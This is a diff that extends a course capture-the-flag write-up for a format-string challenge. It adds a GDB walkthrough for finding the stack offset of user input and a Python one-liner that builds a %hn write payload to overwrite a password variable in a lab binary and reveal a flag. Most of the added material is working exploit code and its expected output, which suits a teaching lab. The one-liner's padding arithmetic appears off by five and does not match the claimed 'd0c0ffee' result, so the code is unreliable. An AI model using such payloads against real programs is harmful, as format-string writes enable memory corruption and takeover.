@@ -306,3 +306,63 @@ This technique applies to many other format-string challenges beyond this one.
 **Both produce the same result:** `0xD0C0FFEE` in memory, flag unlocked.
 
 **Exam tip:** if you are unsure, rebuild the exploit from the manual method first, then switch to the script only after you know the stack index and halfword values.
+
+---
+
+## Extra: GDB Learning Walkthrough
+
+Use GDB to understand exactly what happens:
+
+```bash
+cd /home/jbenjam7/cs466/ctf/formatstring3
+gdb -q ./login
+```
+
+At GDB prompt, set a breakpoint at the vulnerable printf and run:
+
+```gdb
+b myutk_login
+run <<< 'AAAABBBB.%5$p.%6$p'
+```
+
+When you hit the breakpoint, you're about to enter `printf(user_input)`.
+
+Check what the stack shows:
+```gdb
+x/20wx $esp
+p (char*)$esp
+```
+
+You'll see your input string `AAAABBBB.%5$p...` with marker bytes at positions 5 and 6 on the stack.
+
+Then continue:
+```gdb
+c
+```
+
+The output shows where `AAAA` and `BBBB` leak from. This confirms your input is at position 5.
+
+Now understand the write: the goal is to send `%5$hn` and `%6$hn` with padding so the printed character count reaches `53440` at first write and `65518` at second write, overwriting the halfwords of `utk_password`.
+
+---
+
+## Extra: Terminal Python One-liner
+
+For fast exploitation once you know the offset and values:
+
+```bash
+cd /home/jbenjam7/cs466/ctf/formatstring3
+python3 << 'PY'
+import struct, subprocess
+addr_high, addr_low = 0x080e604a, 0x080e6048
+payload = struct.pack('<I', addr_high) + struct.pack('<I', addr_low)
+payload += b'X' * (53440 - 8) + b'%5$hn' + b'Y' * (65518 - 53440 - 5) + b'%6$hn'
+print(subprocess.Popen(['./login'], stdin=subprocess.PIPE, stdout=subprocess.PIPE).communicate(payload)[0].decode())
+PY
+```
+
+Expected output includes:
+```
+d0c0ffee 0x80e6048
+cosc466-flag-{format_strings_are_powerful}
+```
